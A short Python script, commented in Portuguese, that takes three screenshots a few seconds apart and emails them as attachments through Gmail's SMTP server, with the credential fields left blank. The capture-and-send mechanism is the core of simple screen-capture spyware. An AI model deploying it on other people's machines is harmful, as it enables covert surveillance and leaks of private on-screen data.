import pyautogui
import time
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
import smtplib

msg = MIMEMultipart()
sscount = 0

def anexo(): #Anexa as imagens para o email
    file = open("screenshot0.png", "rb")
    msg.attach(MIMEImage(file.read()))
    file.close()

    file = open('screenshot1.png', 'rb')
    msg.attach(MIMEImage(file.read()))
    file.close()
 
    file = open("screenshot2.png", "rb")
    msg.attach(MIMEImage(file.read()))
    file.close()

def email():
    password = "" #Senha Email
    msg['From'] = "" #Endereço Email
    msg['To'] = "" #Endereço Email para enviar
    msg['Subject'] = "Screenshots"

    anexo()

    server = smtplib.SMTP('smtp.gmail.com: 587') #simple mail transfer protocol
    server.starttls()

    server.login(msg['From'], password)
 
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()

def screenshot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save('screenshot'+str(sscount)+'.png')

 
for i in range (3):
    screenshot()
    sscount = sscount + 1
    time.sleep(2) #2 segundos delay
    
email()
